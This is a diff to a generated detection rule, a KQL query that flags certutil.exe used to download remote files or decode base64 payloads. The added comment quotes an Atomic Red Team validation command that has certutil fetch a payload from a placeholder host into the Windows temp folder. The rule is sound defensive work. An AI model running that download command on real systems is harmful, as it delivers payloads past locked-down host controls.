@@ -1,6 +1,8 @@
 // certutil Used as a Downloader
 // Detects certutil fetching remote content or decoding base64 payloads. It is a signed Microsoft binary present everywhere, which makes it a favourite substitute for curl on locked-down hosts.
-// techniques: T1105   severity: high
+// techniques: T1105   severity: high   status: stable
+// validate: Atomic Red Team T1105
+//   certutil.exe -urlcache -split -f http://<host>/payload.txt C:\Windows\Temp\p.txt
 // source: rules/execution/certutil-download.yml  (GENERATED, do not edit by hand)
 Event
 | where (((NewProcessName endswith "\\certutil.exe")) and ((CommandLine has_any (dynamic(["urlcache", "verifyctl", "decode", "-f http"])))))
